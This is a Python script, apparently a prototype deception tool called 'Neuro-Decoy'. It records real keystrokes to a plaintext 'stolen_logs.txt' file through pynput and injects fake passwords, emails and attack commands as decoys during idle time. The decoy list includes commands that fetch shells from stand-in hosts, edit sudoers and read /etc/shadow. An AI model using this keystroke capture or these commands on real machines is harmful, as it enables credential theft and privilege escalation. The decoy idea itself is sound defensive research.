import time
import random
import string
import threading
import os
from pynput import keyboard

# ==========================================
# MODULE 1: The Brain (Your Decoy Generator)
# ==========================================
class DecoyGenerator:
    WORDS = [
        "admin", "root", "kali", "hack", "pass", "secret", "backup",
        "server", "local", "cloud", "shadow", "nmap", "exploit", "shell",
        "payload", "agent", "vpn", "proxy", "session", "token",
    ]

    COMMANDS = [
        "ls -la", "cat /etc/passwd", "whoami", "id",
        "ps aux", "netstat -tulpn", "ifconfig", "curl http://10.0.0.1/shell.sh",
        "nc -lvnp 4444", "chmod +x payload", "sudo -l",
        "find / -perm -4000 2>/dev/null", "ssh root@192.168.1.1",
        "scp exploit.tar.gz user@10.0.0.5:/tmp/", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers",
        "wget http://evil.com/backdoor", "./reverse_shell",
        "cat /etc/shadow", "nmap -sV -p- 10.0.0.0/24",
    ]

    DOMAINS = ["gmail.com", "protonmail.com", "outlook.com", "yahoo.com", "pm.me"]

    def _generate_password(self, length=12):
        word = random.choice(self.WORDS)
        suffix = "".join(random.choices(string.digits, k=4))
        special = random.choice("!@#$%^&*")
        if random.choice([True, False]):
            return f"{word}{special}{suffix}".capitalize()
        return f"{word.capitalize()}{suffix}{special}"

    def _generate_email(self):
        local = random.choice(self.WORDS) + str(random.randint(10, 999))
        domain = random.choice(self.DOMAINS)
        return f"{local}@{domain}"

    def _generate_command(self):
        return random.choice(self.COMMANDS)

    def get_random_decoy(self):
        category = random.choice(["password", "email", "command"])
        if category == "password":
            return self._generate_password()
        elif category == "email":
            return self._generate_email()
        return self._generate_command()


# ==========================================
# MODULE 2: The Core Engine (Idle-Time Burst)
# ==========================================
class NeuroDecoy:
    def __init__(self):
        self.decoy_gen = DecoyGenerator()
        self.last_type_time = time.time()
        self.running = True

    def on_press(self, key):
        self.last_type_time = time.time()
        try:
            with open("stolen_logs.txt", "a") as f:
                if hasattr(key, "char") and key.char is not None:
                    f.write(key.char)
                else:
                    f.write(f" [{key}] ")
        except Exception as e:
            print(f"[-] Error logging key: {e}")

    def _write_keystrokes(self, f, chars):
        for c in chars:
            f.write(c)

    def _typo_backspace(self, f, char):
        wrong = random.choice(string.ascii_lowercase.replace(char.lower(), ""))
        f.write(wrong)
        f.write(" [Key.backspace] ")

    def idle_monitor(self):
        print("[*] Neuro-Decoy Deception Engine Activated.")
        print("[*] Waiting for 1.5s of typing inactivity to inject decoys...\n")
        LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stolen_logs.txt")

        while self.running:
            time.sleep(0.5)

            if time.time() - self.last_type_time > 1.5:
                decoy_string = self.decoy_gen.get_random_decoy()

                try:
                    with open(LOG, "a") as f:
                        for i, ch in enumerate(decoy_string):
                            if time.time() - self.last_type_time < 1.0:
                                break
                            if ch == " ":
                                f.write(" [Key.space] ")
                            elif ch == "@":
                                f.write("@")
                            elif ch == ".":
                                f.write(".")
                            elif ch == "/":
                                f.write("/")
                            elif ch == "-":
                                f.write("-")
                            else:
                                if (
                                    ch.isalpha()
                                    and random.random() < 0.08
                                    and i > 1
                                ):
                                    self._typo_backspace(f, ch)
                                f.write(ch)
                        else:
                            f.write(" [Key.enter] \n")
                except Exception as e:
                    print(f"[-] Error writing decoy: {e}")

                print(f"[+] Injected decoy burst: {decoy_string}")
                self.last_type_time = time.time()

    def start(self):
        monitor_thread = threading.Thread(target=self.idle_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()

        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                self.running = False
                print("\n[*] Shutting down Neuro-Decoy.")


if __name__ == "__main__":
    defender = NeuroDecoy()
    defender.start()